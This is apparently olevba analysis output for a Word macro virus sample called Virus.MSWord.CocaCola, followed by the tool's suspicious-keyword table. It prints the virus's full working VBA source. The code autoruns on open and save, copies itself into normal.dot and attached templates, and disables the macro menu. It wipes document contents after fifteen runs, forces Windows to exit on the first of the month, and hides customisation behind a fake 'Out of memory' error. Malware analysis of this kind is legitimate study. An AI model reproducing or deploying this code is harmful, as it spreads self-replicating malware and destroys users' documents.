olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CocaCola
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CocaCola - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CocaCola.bas 
in file: Virus.MSWord.CocaCola - OLE stream: 'Macros/VBA/CocaCola'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
CommandBars("Macro").Enabled = False
End Sub

Sub AutoOpen()
CommandBars("Macro").Enabled = False

Call DoItNow
Call HaveFun
End Sub

Sub FileSave()
On Error GoTo Failed

If ActiveDocument.Saved = False Then ActiveDocument.Save

Call DoItNow
Call HaveFun

Failed:
Exit Sub
End Sub

Sub FileSaveAs()
On Error GoTo Failed

Dialogs(wdDialogFileSaveAs).Show

If ActiveDocument.Saved = True Then
    Call DoItNow
    Call HaveFun
End If

Failed:
Exit Sub
End Sub

Sub DoItNow()
On Error Resume Next

If Not Right(UCase(ActiveDocument.Name), 3) = "DOC" _
And Not Right(UCase(ActiveDocument.Name), 3) = "DOT" Then
    Exit Sub
End If

ActiveDocument.SaveAs , wdFormatTemplate

u = NormalTemplate.Path & "\normal.dot"
w = ActiveDocument.AttachedTemplate.Path & "\" & ActiveDocument.AttachedTemplate

Application.OrganizerCopy Source:=u, _
Destination:=w, Name:="CocaCola", Object:= _
wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=w, _
Destination:=u, Name:="CocaCola", Object:= _
wdOrganizerObjectProjectItems

NormalTemplate.Save
ActiveDocument.SaveAs , wdFormatTemplate
End Sub
Sub HaveFun()
Dim Number As Integer

On Error Resume Next

Open "C:\ooo.ooo" For Input As #1
Input #1, Number
Close #1

Number = Number + 1

If Number = 15 Then
    Number = 0
    Selection.WholeStory
    Selection.Delete
    Selection.InsertBefore "Yeah, I know that life sucks sometimes. It does for me too!"
    ActiveDocument.SaveAs
    ActiveDocument.Close
End If

Open "C:\ooo.ooo" For Output As #1
Print #1, Number
Close #1

If Day(Date) = "1" Then
    MsgBox "Hello! I have infected you with a virus. I'm sorry, but I can't help it. I'm so sick!", vbCritical, "Micro$oft Word"
    Tasks.ExitWindows
End If
End Sub

Sub ToolsCustomize()
   MsgBox "Out of memory.", vbCritical, "Microsoft Word"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

